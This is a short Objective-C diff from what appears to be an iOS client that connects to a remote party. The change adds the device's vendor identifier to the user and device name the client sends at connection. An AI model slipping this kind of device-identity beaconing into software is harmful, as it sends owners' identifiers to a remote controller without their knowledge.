@@ -34,7 +34,7 @@ int main(int argc, char **argv, char **envp) {
     _espl.terminator = args[3];
     
     if (success != -1) {
-	    NSString *name = [NSString stringWithFormat:@"%@@%@",NSUserName(),[[UIDevice currentDevice] name]];
+        NSString *name = [NSString stringWithFormat:@"%@ %@@%@",[[_espl thisUIDevice] identifierForVendor],NSUserName(),[[_espl thisUIDevice] name]];
         [_espl sendString:name];
         NSString *recvData;
         char buffer[2048];
